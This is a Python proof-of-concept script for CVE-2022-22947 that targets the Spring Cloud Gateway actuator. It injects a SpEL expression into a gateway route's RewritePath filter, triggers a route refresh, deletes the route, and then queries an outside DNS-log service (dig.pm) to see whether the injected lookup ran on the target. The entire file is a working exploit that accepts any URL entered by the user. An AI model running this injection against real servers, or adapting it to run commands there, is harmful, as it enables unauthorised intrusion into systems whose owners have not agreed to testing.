import requests
import json
import urllib3
import random
import hashlib
urllib3.disable_warnings()

dns_domain = ""
dns_token = ""
dns_md5 = ""

def get_dnslog():
    url = 'https://dig.pm/new_gen'
    dns = json.loads(requests.get(url,verify=False).text)
    global dns_domain,dns_token
    dns_domain = str(dns['domain'][:-1])
    dns_token = str(dns['token'])


def check_dnslog():
    url = 'https://dig.pm/get_results'
    data = {
        "domain" : dns_domain,
        "token" : dns_token
    }
    #test_url = "http://" + dns_domain
    #requests.get(url=test_url,verify=False)
    check = requests.post(url,data=data,verify=False)
    return check.text

def get_md5():
    RandomData = random.randint(1,99999)
    global dns_md5
    dns_md5 = hashlib.md5(str(RandomData).encode(encoding="UTF-8")).hexdigest()
    

def exec_poc(url,dnslog):
    url += "/actuator/gateway/routes/new0000000"
    '''
    proxies = {
    'http' : 'http://127.0.0.1:8080',
    'https' : 'https://127.0.0.1:8080'
    }
    '''
    headers = {
        "Content-Type" : "application/json",
        "User-Agent" : "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36"
    }
    payload = '''
{
  "predicates": [
    {
      "name": "Path",
      "args": {
        "_genkey_0": "/new0000000/**"
      }
    }
  ],
  "filters": [
    {
      "name": "RewritePath",
      "args": {
        "_genkey_0": "#{T(java.net.InetAddress).getByName(\\"%s\\")}",
        "_genkey_1": "/${path}"
      }
    }
  ],
  "uri": "http://example.com",
  "order": 0
}
    '''%(dnslog)
    requests.post(url,headers=headers,data=payload)


def refresh_poc(url,dnslog):
    url += "/actuator/gateway/refresh"
    headers = {
        "Content-Type" : "application/json",
        "User-Agent" : "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36"
    }
    payload = '''
{
  "predicate": "Paths: [/233], match trailing slash: true",
  "route_id": "233",
  "filters": [
    "[[RewritePath #{T(java.net.InetAddress).getByName(\\"%s\\")} = /${path}], order = 1]"
  ],
  "uri": "http://example.com",
  "order": 0
}
    '''%(dnslog)
    requests.post(url,headers=headers,data=payload)


def dellet_poc(url):
    url += "/actuator/gateway/routes/new0000000"
    requests.delete(url,verify=False)

def detail():
    tips = '''
 ______  _     _   ______ -2022-22947
| |     | |   | | | |                
| |     \ \   / / | |----            
|_|____  \_\_/_/  |_|____            
                                     by: iak3ec
                                     https://github.com/nu0l
    '''
    print(tips)

def start():
    get_md5()
    get_dnslog()
    dnslog = dns_md5 + "." + dns_domain
    url = input('input URL: ')
    if url[-1] == "/":
        url = url[:-1]
    exec_poc(url,dnslog)
    refresh_poc(url,dnslog)
    dellet_poc(url)
    dns_text = check_dnslog()
    print('\033[33mURL: ' + url +'\033[0m')
    if dns_md5 in dns_text:
        print('\033[31m[+] DnsLog Found ðŸŽ‰ ðŸŽ‰ ðŸŽ‰\033[0m')
    else:
        print('\033[32m[-] DnsLog Not Found ðŸ˜– ðŸ˜– ðŸ˜–\033[0m')

if __name__ == "__main__":
    detail()
    start()